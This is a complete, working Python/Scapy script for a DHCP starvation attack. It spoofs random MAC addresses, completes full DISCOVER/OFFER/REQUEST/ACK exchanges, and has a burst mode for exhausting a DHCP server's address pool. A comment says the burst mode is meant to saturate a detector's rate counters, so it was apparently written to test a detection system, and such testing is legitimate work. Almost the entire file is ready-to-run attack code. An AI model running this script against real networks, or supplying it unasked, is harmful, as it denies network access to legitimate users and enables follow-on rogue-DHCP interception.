#!/usr/bin/env python3

# DHCP Starvation Attack Script
# Use with caution and only in controlled environments for testing purposes.

import argparse
import inspect
import os
import random
import re
import signal
import subprocess
import sys
import threading
import time

# Scapy imports to forge packets.
SCAPY_IMPORT_ERROR = None
try:
    from scapy.all import BOOTP, DHCP, Ether, IP, UDP, get_if_hwaddr, sendp, sniff
except ImportError as exc:
    SCAPY_IMPORT_ERROR = exc
    BOOTP = DHCP = Ether = IP = UDP = get_if_hwaddr = sendp = sniff = None

# Settings.
_running = True
OFFER_TIMEOUT = 6.0
ACK_TIMEOUT = 2.0
REQUEST_RETRIES = 3

def configure_output_buffering():
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(line_buffering=True, write_through=True)
        except Exception:
            pass

configure_output_buffering()

# Check supported terminal colors.
def help_color_enabled():
    if os.environ.get("FORCE_COLOR"):
        return True
    if os.environ.get("NO_COLOR") is not None:
        return False
    if os.environ.get("TERM") == "dumb":
        return False
    return sys.stdout.isatty() or bool(os.environ.get("COLORTERM"))

# To color help page.
class ColorHelpFormatter(argparse.RawDescriptionHelpFormatter):
    RESET = "\033[0m"
    BOLD = "\033[1m"
    CYAN = "\033[36m"
    BLUE = "\033[94m"
    YELLOW = "\033[33m"

    def _c(self, text, color):
        if not help_color_enabled():
            return text
        return f"{color}{text}{self.RESET}"

    def start_section(self, heading):
        super().start_section(self._c(heading, self.BOLD + self.CYAN))

    def _color_cli_syntax(self, text):
        if not help_color_enabled():
            return text

        text = re.sub(
            r"(?<![\w-])(--?[A-Za-z0-9][A-Za-z0-9_-]*)",
            lambda m: self._c(m.group(1), self.BLUE),
            text,
        )
        return re.sub(
            r"(\{[^}]+\}|\b[A-Z][A-Z0-9_]*\b)",
            lambda m: self._c(m.group(1), self.YELLOW),
            text,
        )

    def _color_option_line(self, line):
        match = re.match(r"^(\s+.*?)(\s{2,}\S.*)$", line)
        if not match:
            return self._color_cli_syntax(line)
        return self._color_cli_syntax(match.group(1)) + match.group(2)

    def format_help(self):
        text = super().format_help()
        if not help_color_enabled():
            return text

        lines = []
        in_usage = False
        for line in text.splitlines():
            if line.startswith("usage:"):
                in_usage = True
                line = (self._c("usage:", self.BOLD + self.CYAN) +
                        self._color_cli_syntax(line[len("usage:"):]))
            elif in_usage and line.strip():
                line = self._color_cli_syntax(line)
            elif in_usage:
                in_usage = False
            elif re.match(r"^\s+--?[A-Za-z0-9]", line):
                line = self._color_option_line(line)
            lines.append(line)
        return "\n".join(lines) + ("\n" if text.endswith("\n") else "")

def non_negative_int(value):
    try:
        parsed = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("must be an integer") from exc
    if parsed < 0:
        raise argparse.ArgumentTypeError("must be >= 0")
    return parsed

def non_negative_float(value):
    try:
        parsed = float(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("must be a number") from exc
    if parsed < 0.0:
        raise argparse.ArgumentTypeError("must be >= 0")
    return parsed

# Create the random generatorr used for the fixed repeated MAC.
def repeated_mac_rng(seed, repeat_seed):
    if repeat_seed is not None:
        return random.Random(repeat_seed)
    if seed is not None:
        return random.Random(seed)
    return random.Random()

def dhcp_message_type(pkt):
    if DHCP not in pkt:
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == 'message-type':
            return opt[1]
    return None

# Recognize a DHCP message type like offer, ack or nak.
def has_dhcp_message_type(pkt, names, codes):
    msg_type = dhcp_message_type(pkt)
    if isinstance(msg_type, int):
        return msg_type in codes
    if msg_type is None:
        return False
    return str(msg_type).lower() in names

# Utility function to generate random MAC addresses with configurable LA-bit.
def random_mac(la_mode='on', rng=random):
    r = rng.randint(0, 255)
    if la_mode == 'on':
        first = (r & 0xFE) | 0x02   # LA-bit = 1, unicast
    elif la_mode == 'off':
        first = r & 0xFC             # LA-bit = 0, unicast (globally administered)
    else:                            # mixed
        if rng.randint(0, 1):
            first = (r & 0xFE) | 0x02
        else:
            first = r & 0xFC
    return ':'.join(['{:02x}'.format(first)] +
                    ['{:02x}'.format(rng.randint(0, 255)) for _ in range(5)])

def enable_promiscuous_mode(iface):
    try:
        subprocess.run(["ip", "link", "set", iface, "promisc", "on"],
                       check=True, capture_output=True, text=True)
        return True
    except FileNotFoundError:
        fail("'ip' command not found. This script must run on a system with iproute2.")
    except PermissionError as exc:
        fail(f"cannot execute 'ip': {exc}")
    except subprocess.CalledProcessError as exc:
        detail = (exc.stderr or exc.stdout or "").strip()
        if not detail:
            detail = f"exit status {exc.returncode}"
        fail(f"cannot enable promiscuous mode on '{iface}': {detail}")
    return False

def fail(message):
    print(f"[FAIL] [ATTK] {message}", file=sys.stderr)

def build_discover_packet(ether_src, mac_bytes, xid):
    chaddr = mac_bytes + (b'\x00' * 10)
    return (Ether(src=ether_src, dst='ff:ff:ff:ff:ff:ff') /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[('message-type', 'discover'),
                          ('client_id', b'\x01' + mac_bytes),
                          ('param_req_list', [1, 3, 6, 15, 28, 51, 58, 59]),
                          'end']))

# Main attack function.
def dhcp_starvation(iface, count=150, la_mode='on', seed=None, delay=0.0,
                    no_wait=False, repeat_every=0, repeat_seed=None,
                    keep_ether_src=False):
    global _running

    if SCAPY_IMPORT_ERROR is not None:
        fail(f"Scapy is not installed or cannot be imported: {SCAPY_IMPORT_ERROR}")
        print("[ATTK] Install it with: python3 -m pip install scapy",
              file=sys.stderr)
        return 1

    # Needed to receive OFFERs sent to broadcast MAC, so enable promiscuous mode.
    if not enable_promiscuous_mode(iface):
        return 1

    repeated_mac = None
    if repeat_every > 0:
        repeated_mac = random_mac(la_mode, repeated_mac_rng(seed, repeat_seed))
        unique_seed = seed + 1000 if seed is not None else None
        mac_rng = random.Random(unique_seed) if unique_seed is not None else random
    else:
        mac_rng = random.Random(seed) if seed is not None else random

    try:
        real_iface_mac = get_if_hwaddr(iface)
    except Exception as exc:
        fail(f"cannot read MAC address for interface '{iface}': {exc}")
        return 1

    leased = 0
    sent_discovers = 0
    batch_burst = no_wait and delay == 0.0
    burst_packets = []
    burst_logs = []

    for i in range(count):
        if not _running:
            break

        request_started = time.monotonic()

        # Generate a random MAC address for each DISCOVER, optionally reusing
        # one fixed MAC at a regular interval for same+unique traffic patterns.
        repeated_request = repeat_every > 0 and i % repeat_every == 0
        mac = repeated_mac if repeated_request else random_mac(la_mode, mac_rng)
        ether_src = real_iface_mac.lower() if keep_ether_src else mac
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        chaddr = mac_bytes + (b'\x00' * 10)
        # The xid must be unique for each DISCOVER to correlate the OFFER response, so generate a random one.
        xid = random.randint(0, 0xFFFFFFFF)
        discover_pkt = build_discover_packet(ether_src, mac_bytes, xid)

        if no_wait:
            # Burst mode: send only DISCOVERs without waiting for OFFERs.
            # This allows saturating the detector's rate counters (F2/F3/F5) in a
            # true burst, since waiting for each OFFER would serialize requests (~6s each).
            kind = 'repeated' if repeated_request else 'unique'
            log_line = f'[ATTK {i+1}] DISCOVER sent ({kind} MAC {mac}).'
            if batch_burst:
                burst_packets.append(discover_pkt)
                burst_logs.append(log_line)
            else:
                try:
                    sendp(discover_pkt, iface=iface, verbose=False)
                except Exception as exc:
                    fail(f"failed to send DHCP DISCOVER on '{iface}': {exc}")
                    return 1
                sent_discovers += 1
                print(log_line)
        else:
            offered_ip = [None]
            server_id = [None]
            sniff_ready = threading.Event()
            sniff_error = [None]

            # Open sniff socket in a thread BEFORE sending the DISCOVER.
            # Authoritative DHCP servers can respond in < 1ms, so wait for Scapy
            # to report that packet capture has started before sending.
            def _sniff(x=xid, out=offered_ip, srv=server_id):
                try:
                    pkts = sniff(iface=iface,
                                 filter='udp and (src port 67 or dst port 68)',
                                 lfilter=lambda p, xx=x: (
                                     BOOTP in p and p[BOOTP].xid == xx and
                                     has_dhcp_message_type(p, {'offer'}, {2})
                                 ),
                                 count=1, timeout=OFFER_TIMEOUT,
                                 started_callback=sniff_ready.set)
                except Exception as exc:
                    sniff_error[0] = exc
                    sniff_ready.set()
                    return

                if pkts:
                    out[0] = pkts[0][BOOTP].yiaddr
                    for opt in pkts[0][DHCP].options:
                        if isinstance(opt, tuple) and opt[0] == 'server_id':
                            srv[0] = opt[1]
                            break
            t = threading.Thread(target=_sniff, daemon=True)
            t.start()
            if not sniff_ready.wait(timeout=2.0):
                print(f'[ATTK {i+1}] Sniffer did not become ready, skipping request.')
                continue
            if sniff_error[0] is not None:
                fail(f"sniffer failed on interface '{iface}': {sniff_error[0]}")
                return 1

            # Send DHCP DISCOVER with the generated MAC and xid, and set the broadcast flag (0x8000) to ensure we receive OFFERs sent to the broadcast MAC.
            try:
                sendp(discover_pkt, iface=iface, verbose=False)
            except Exception as exc:
                fail(f"failed to send DHCP DISCOVER on '{iface}': {exc}")
                return 1

            t.join()
            if sniff_error[0] is not None:
                fail(f"sniffer failed on interface '{iface}': {sniff_error[0]}")
                return 1

            # Offer.
            if not offered_ip[0] or offered_ip[0] == '0.0.0.0':
                print(f'[ATTK {i+1}] No OFFER received.')
            else:
                request_options = [('message-type', 'request'),
                                   ('client_id', b'\x01' + mac_bytes),
                                   ('requested_addr', offered_ip[0])]
                if server_id[0]:
                    request_options.append(('server_id', server_id[0]))
                request_options.append('end')

                kind = 'repeated' if repeated_request else 'unique'
                confirmed_ip = [None]
                got_nak = [False]

                # ACK.
                for attempt in range(1, REQUEST_RETRIES + 1):
                    ack_ready = threading.Event()
                    ack_error = [None]

                    def _sniff_ack(x=xid, out=confirmed_ip, nak=got_nak):
                        try:
                            pkts = sniff(iface=iface,
                                         filter='udp and (src port 67 or dst port 68)',
                                         lfilter=lambda p, xx=x: (
                                             BOOTP in p and p[BOOTP].xid == xx and
                                             has_dhcp_message_type(p, {'ack', 'nak'}, {5, 6})
                                         ),
                                         count=1, timeout=ACK_TIMEOUT,
                                         started_callback=ack_ready.set)
                        except Exception as exc:
                            ack_error[0] = exc
                            ack_ready.set()
                            return

                        if not pkts:
                            return
                        if has_dhcp_message_type(pkts[0], {'ack'}, {5}):
                            out[0] = pkts[0][BOOTP].yiaddr or offered_ip[0]
                        elif has_dhcp_message_type(pkts[0], {'nak'}, {6}):
                            nak[0] = True

                    ack_thread = threading.Thread(target=_sniff_ack, daemon=True)
                    ack_thread.start()
                    if not ack_ready.wait(timeout=2.0):
                        print(f'[ATTK {i+1}] ACK sniffer did not become ready, skipping REQUEST.')
                        break
                    if ack_error[0] is not None:
                        fail(f"ACK sniffer failed on interface '{iface}': {ack_error[0]}")
                        return 1

                    # Send DHCP REQUEST to accept the offered IP, again with the same DHCP MAC and xid.
                    try:
                        sendp(Ether(src=ether_src, dst='ff:ff:ff:ff:ff:ff') /
                              IP(src='0.0.0.0', dst='255.255.255.255') /
                              UDP(sport=68, dport=67) /
                              BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
                              DHCP(options=request_options),
                              iface=iface, verbose=False)
                    except Exception as exc:
                        fail(f"failed to send DHCP REQUEST on '{iface}': {exc}")
                        return 1

                    ack_thread.join()
                    if ack_error[0] is not None:
                        fail(f"ACK sniffer failed on interface '{iface}': {ack_error[0]}")
                        return 1
                    if confirmed_ip[0]:
                        leased += 1
                        print(f'[ATTK {i+1}] Leased {confirmed_ip[0]} with {kind} MAC {mac} (ACK confirmed).')
                        break
                    if got_nak[0]:
                        print(f'[ATTK {i+1}] DHCP NAK received for {kind} MAC {mac}.')
                        break
                    if attempt < REQUEST_RETRIES:
                        print(f'[ATTK {i+1}] No ACK received for {offered_ip[0]} (retry {attempt}/{REQUEST_RETRIES}).')

                if not confirmed_ip[0] and not got_nak[0]:
                    print(f'[ATTK {i+1}] No ACK received for {offered_ip[0]}; lease not confirmed.')

        if delay > 0 and i + 1 < count and _running:
            elapsed = time.monotonic() - request_started
            sleep_for = delay - elapsed
            if sleep_for > 0:
                time.sleep(sleep_for)

    if batch_burst and burst_packets:
        try:
            sendp(burst_packets, iface=iface, verbose=False, inter=0)
        except Exception as exc:
            fail(f"failed to send DHCP DISCOVER burst on '{iface}': {exc}")
            return 1
        sent_discovers = len(burst_packets)
        for line in burst_logs:
            print(line)

    if no_wait:
        print(f'\n[ATTK] Attack finished. DISCOVERs sent: {sent_discovers}.')
    else:
        print(f'\n[ATTK] Attack finished. Completed leases: {leased}/{count}.')
    return 0

if __name__ == '__main__':

    # SIGINT handler to allow graceful shutdown on Ctrl+C.
    def _sigint(sig, frame):
        global _running
        _running = False
        print('\n[ATTK] Ctrl+C received, stopping...')
    signal.signal(signal.SIGINT, _sigint)

    # Args parsing logic.
    parser_kwargs = {
        "description": "DHCP Starvation Attack",
        "formatter_class": ColorHelpFormatter,
        "add_help": False,
    }
    if "color" in inspect.signature(argparse.ArgumentParser).parameters:
        parser_kwargs["color"] = False
    parser = argparse.ArgumentParser(**parser_kwargs)
    parser.add_argument('--help', action='help',
                        help='Show this help message and exit')
    parser.add_argument('iface', help='Network interface (for example: ens192, eth0)')
    parser.add_argument('--count', type=non_negative_int, default=150,
                        help='Total number of requests (default: 150)')
    parser.add_argument('--la', choices=['on', 'off', 'mixed'], default='on',
                        help='LA-bit mode: on=all LA=1, off=all LA=0, mixed=random (default: on)')
    parser.add_argument('--seed', type=int,
                        help='Integer seed for MAC generation. Reusing the same seed with --count 1 reuses the same MAC.')
    parser.add_argument('--delay', type=non_negative_float, default=0.0,
                        help='Target seconds between request attempts (default: 0.0)')
    parser.add_argument('--no-wait', action='store_true',
                        help='Send only DISCOVERs without sniffing for OFFERs (burst mode)')
    parser.add_argument('--repeat-every', type=non_negative_int, default=0,
                        help='Reuse one fixed MAC every Nth request; 0 disables this mode (default: 0)')
    parser.add_argument('--repeat-seed', type=int,
                        help='Seed for the fixed MAC reused by --repeat-every; only valid when --repeat-every > 0.')
    parser.add_argument('--keep-ether-src', action='store_true',
                        help='Keep the interface hardware MAC as Ethernet source instead of spoofing it to match the DHCP client MAC.')
    args = parser.parse_args()
    if args.repeat_seed is not None and args.repeat_every == 0:
        parser.error('--repeat-seed can be used only when --repeat-every is greater than 0')

    # Core.
    sys.exit(dhcp_starvation(args.iface, count=args.count, la_mode=args.la,
                             seed=args.seed, delay=args.delay,
                             no_wait=args.no_wait,
                             repeat_every=args.repeat_every,
                             repeat_seed=args.repeat_seed,
                             keep_ether_src=args.keep_ether_src))
